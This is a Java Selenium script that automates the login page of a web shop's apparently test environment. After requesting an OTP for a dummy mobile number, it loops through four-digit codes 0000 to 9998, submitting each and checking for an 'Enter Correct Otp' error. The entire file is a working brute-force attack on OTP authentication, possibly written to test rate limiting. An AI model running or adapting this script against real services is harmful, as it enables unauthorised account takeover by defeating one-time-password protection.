import java.time.Duration;
import org.openqa.selenium.By;
import org.openqa.selenium.chrome.ChromeDriver;

public class Login {

	public static void main(String[] args) throws InterruptedException {

		ChromeDriver driver = new ChromeDriver();
		driver.manage().window().maximize();
		driver.get("https://testingenv-2021.toolsvilla.in/");
		driver.findElement(By.xpath("//div[@class=\"header header-desk\"]//button[contains(@class,\"relative\")]"))
				.click();
		driver.findElement(By.xpath("//div[@class=\"login-menu\"]/div[@class=\"menu-item\"]")).click();
		driver.findElement(By.xpath("//form/div/input[@placeholder=\"Mobile Number\"]")).sendKeys("5555555555");
		driver.findElement(By.xpath("//form/div/button[contains(@class,\"otp-button\")]")).click();

		driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(15));
		String val = "0000";
		for (int i = 0; i < 9999; i++) {
			int a = Integer.parseInt(val);
			System.out.println("Original value"+val);
			By otpInput = By.xpath("//div//input[@id=\"otp1\"]");

			// Clear the previous value in the OTP input field
			driver.findElement(otpInput).clear();

			// Input the new value of val into the OTP field
			driver.findElement(otpInput).sendKeys(val);

			driver.findElement(
					By.xpath("//div[@class=\"text-center get-otp\"]/button[contains(@class,\"active-button\")]"))
					.click();
			//Thread.sleep(2000);

			// Attempt to locate the error message element
			String errorText = driver
					.findElement(By.xpath("//div[@class=\"product-dialog\"]//div[@class=\"error-validation\"]"))
					.getText();
			if (errorText.equals("Enter Correct Otp")) {

				a++;
				val = String.format("%04d", a);
				System.out.println("incremented value"+val);
			}

		}
	}
}
